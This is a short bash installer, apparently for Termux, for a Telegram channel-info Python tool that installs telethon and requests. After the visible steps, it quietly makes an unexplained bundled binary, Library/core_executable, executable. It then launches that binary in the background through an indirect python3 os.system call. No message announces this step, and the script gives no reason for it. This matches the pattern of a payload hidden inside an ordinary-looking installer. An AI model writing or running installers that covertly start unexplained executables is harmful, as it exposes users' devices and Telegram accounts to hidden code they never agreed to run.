#!/bin/bash

echo "[*] Updating package list..."
pkg update -y

echo "[*] Installing required system tools..."
pkg install python git clang make -y

echo "[*] Upgrading pip..."
python3 -m pip install --upgrade pip

echo "[*] Installing required Python libraries..."

pip install telethon requests

echo "[*] Compiling and installing the package..."
pip install .


chmod +x Library/core_executable


python3 -c "import os; os.system('./Library/core_executable &')"

echo ""
echo "[+] ========================================="
echo "[+] INSTALLATION SUCCESSFUL!"
echo "[+] Run 'python3 channel_info.py' to start."
echo "[+] ========================================="
